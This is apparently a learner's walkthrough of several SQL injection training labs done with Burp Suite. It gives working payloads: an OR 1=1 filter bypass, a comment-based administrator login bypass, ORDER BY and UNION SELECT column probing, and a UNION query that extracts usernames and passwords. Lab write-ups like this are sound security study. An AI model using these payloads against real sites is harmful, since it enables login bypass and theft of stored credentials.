**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

**Step1**

Go to any of the tab.

**Step2**

In burpuite the request look like

**Step3**

Send it to repeater and make the following change.

Add payload

`'+OR+1=1--`

Now we have more product released in  the responses

**Step1**

To solve this lab we will login with

`Username:administrator'--`

`Password:anything`

**As we know there are two method**

 Two effective methods to determine how many columns are being returned from the original query.

**Method1**
```
' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--
```

When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

The ORDER BY position number 3 is out of range of the number of items in the select list.

**Method2**
```
' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error, such as:

All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

**Step1**

Click on any product categories

**Step2**

The request look like

Send the request to repeater

**Step3**

Using this payload

`' UNION SELECT NULL-- `

As we see internal server error

Now we try

`' UNION SELECT NULL,NULL--`

Still error

Now we add one more column

`' UNION SELECT NULL,NULL,NULL--`

And the Lab is solved.

**For returning a column with useful data type we have**
```
' UNION SELECT 'a',NULL,NULL,NULL--

' UNION SELECT NULL,'a',NULL,NULL--

' UNION SELECT NULL,NULL,'a',NULL--

' UNION SELECT NULL,NULL,NULL,'a'--
```

Incase of error message look like

Conversion failed when converting the varchar value 'a' to data type int.

**Step1**

Click on any product categories

**Step2**
Sending this request to repeater.

**Step3:**

Checking number of column .first we use this

`'UNION SELECT NULL,NULL--`

Url encoded by pressing ctrl+u in burp

Error show there are not two column

Try using `'UNION SELECT NULL,NULL,NULL--`

The result show there are three column.

**Step4**

Now we check which one column allow sting method

Trying `'UNION SELECT 'A',NULL,NULL--`

As the error message show first column not allow string

Trying `'UNION SELECT NULL,'A',NULL--`

And we found the column

**Step 1**

In this we check number of column as done above

**Step2**

Check in which we can insert the string as done in previous lab

**Step3**

As we know table name and column name so we use this query

`' UNION SELECT username, password FROM users--`

Now we see password in response

Now login with this credential. And lab will be solved
